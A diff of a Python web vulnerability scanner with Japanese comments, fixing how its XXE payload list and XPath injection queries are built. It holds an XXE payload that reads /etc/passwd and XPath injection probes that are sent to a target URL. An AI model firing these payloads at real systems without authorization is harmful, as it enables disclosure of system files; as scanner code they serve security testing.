@@ -105,14 +105,14 @@ XSLT_PAYLOADS = [
     </xsl:stylesheet>
     '''
 ]
-XXE_PAYLOADS = """
+XXE_PAYLOADS = ['''
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
 ]>
 <foo>&xxe;</foo>
-"""
-
+'''
+]
 
 # ロガー初期化(本日日付でログファイルを生成)
 today_str = datetime.datetime.now().strftime("%Y-%m-%d")
@@ -720,8 +720,7 @@ def test_unicode_injection(url: str, param: str) -> None:
 
 #XPathインジェクション検証　　
 def test_xpath_injection(url: str) -> None:
-    # 脆弱なXPathクエリ
-    query = f"//user[username='{payload}']/password"
+    
     
     #比較用のレスポンステキスト
     try:
@@ -732,6 +731,9 @@ def test_xpath_injection(url: str) -> None:
         return
     
     for payload in XPATH_PAYLOADS:
+        # 脆弱なXPathクエリ
+        query = f"//user[username='{payload}']/password"
+
         try:
             response_pattern = requests.get(url, params=query,  headers={'Content-Type': 'application/xml'})
             
@@ -856,6 +858,7 @@ def test_xxe(url: str) -> None:
         return
         
     for payload in XXE_PAYLOADS:
+        
         try:
             response_pattern = requests.post(url, data=payload.encode('utf-8'),  headers={'Content-Type': 'application/xml'}, timeout=10 )
             
